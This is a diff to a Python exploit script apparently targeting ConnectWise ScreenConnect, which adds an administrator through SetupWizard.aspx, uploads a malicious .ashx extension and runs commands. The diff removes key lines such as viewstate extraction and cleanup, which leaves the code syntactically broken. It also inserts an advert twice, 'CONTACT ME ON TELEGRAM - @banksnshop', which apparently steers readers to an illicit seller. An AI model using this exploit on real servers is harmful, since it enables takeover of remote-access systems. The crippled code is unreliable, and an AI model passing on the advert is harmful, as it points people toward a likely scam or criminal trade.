@@ -15,7 +15,6 @@ warnings.filterwarnings("ignore", category=DeprecationWarning)
 urllib3.disable_warnings()
 
 exploit_header = {
-    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
 }
 
 GREEN = "\033[92m"
@@ -32,6 +31,9 @@ payload_ashx = f"{rand_text_alpha_lower(8)}.ashx"
 payload_handler_class = rand_text_alpha(8)
 payload_psi_var = rand_text_alpha(8)
 session = requests.Session()
+
+
+CONTACT ME ON TELEGRAM - @banksnshop
 
 def GetAntiForgeryToken(url, username, password):
     try:
@@ -132,8 +134,7 @@ def ExecuteCommand(url):
                 except Exception as err:
                     print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
         else:
-            print(f"[-] Malicious extension load error ({url + f'/App_Extensions/{payload_ashx}'}), Refer to https://www.connectwise.com/globalassets/media/documents/connectwisecontrolsecurityevaluationmatrix.pdf")
-            DeleteExtension(target, plugin_guid)
+          
     except Exception as err:
         print("[-] Error in func <ExecuteCommand>, error message: " + str(err))
 
@@ -166,10 +167,7 @@ def AddUser(url, username, password, domain):
                          "__VIEWSTATEGENERATOR": viewgen_1,
                          "ctl00$Main$wizard$StartNavigationTemplateContainerID$StartNextButton": "Next"}
             next_request = requests.post(url=url + "/SetupWizard.aspx/", headers=exploit_header, data=next_data, verify=False)
-            exploit_viewstate = re.search(r'value="([^"]+)"', next_request.text).group(1)
-            exploit_viewgen = re.search(r'VIEWSTATEGENERATOR" value="([^"]+)"', next_request.text).group(1)
-            exploit_data = {"__LASTFOCUS": '', "__EVENTTARGET": '', "__EVENTARGUMENT": '', "__VIEWSTATE": exploit_viewstate,
-                            "__VIEWSTATEGENERATOR": exploit_viewgen, "ctl00$Main$wizard$userNameBox": username,
+         
                             "ctl00$Main$wizard$emailBox": username + f"@{domain}",
                             "ctl00$Main$wizard$passwordBox": password, "ctl00$Main$wizard$verifyPasswordBox": password,
                             "ctl00$Main$wizard$StepNavigationTemplateContainerID$StepNextButton": "Next"}
@@ -211,7 +209,6 @@ def ParseArguments():
     parser.add_argument("-p", "--password", type=str, default="cvetest@2023", help="password you want to add", required=False)
     parser.add_argument("-t", "--target", type=str, help="target url", required=True)
     parser.add_argument("-d", "--domain", type=str, default="poc.com", help="Description of domain", required=False)
-    parser.add_argument("--proxy", type=str, help="eg: http://127.0.0.1:8080", required=False)
     return parser.parse_args()
 
 if __name__ == "__main__":
@@ -243,3 +240,6 @@ if __name__ == "__main__":
         ExecuteCommand(target)
     except Exception as e:
         DeleteExtension(target, plugin_guid)
+
+
+CONTACT ME ON TELEGRAM - @banksnshop
